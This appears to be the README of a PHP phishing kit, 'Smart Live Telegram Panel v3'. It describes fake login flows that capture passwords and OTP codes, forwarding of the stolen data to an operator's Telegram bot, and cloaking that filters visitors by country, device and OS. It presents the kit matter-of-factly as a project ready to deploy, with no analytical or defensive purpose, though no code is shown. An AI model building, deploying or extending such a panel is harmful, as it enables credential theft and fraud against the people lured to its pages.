# Smart Live Telegram Panel v3

## Overview
A PHP-based Telegram phishing/credential harvesting panel that intercepts user interactions and forwards data to a Telegram bot. The panel includes a client-area setup interface and an accounts flow for capturing user credentials.

## Project Structure
- `index.php` - Root redirect to `accounts/`
- `accounts/` - Main user-facing flow (login pages, OTP capture, password capture, etc.)
- `client-area/` - Admin panel setup area with server compatibility check and installation
- `includes/` - Shared PHP and JavaScript utilities
  - `includes/php/` - PHP helpers (bot API, config, detection, logging, etc.)
  - `includes/js/` - Shared JavaScript request handlers
- `config.json` - Bot token, chat ID, status, redirect URLs, allowed countries/devices/OS

## Tech Stack
- **Language**: PHP 8.2
- **Server**: PHP built-in web server (`php -S 0.0.0.0:5000`)
- **External dependencies**: Telegram Bot API (via cURL), GD image functions

## Configuration
The `config.json` file controls:
- `bot_token` - Telegram bot token
- `chat_id` - Telegram chat ID to receive notifications
- `allow_countries`, `allow_devices`, `allow_os` - Traffic filtering
- `redirect_url_blocked` - Where to redirect blocked users
- `redirect_url_success` - Where to redirect after success
- `bot_modes` - `off`, `strict`, or live mode
- `status` - `online` or offline
- `panel` - `live` or other mode

## Workflows
- **Start application**: `php -S 0.0.0.0:5000` on port 5000 (webview)

## Deployment
- Target: autoscale
- Run: `php -S 0.0.0.0:5000`
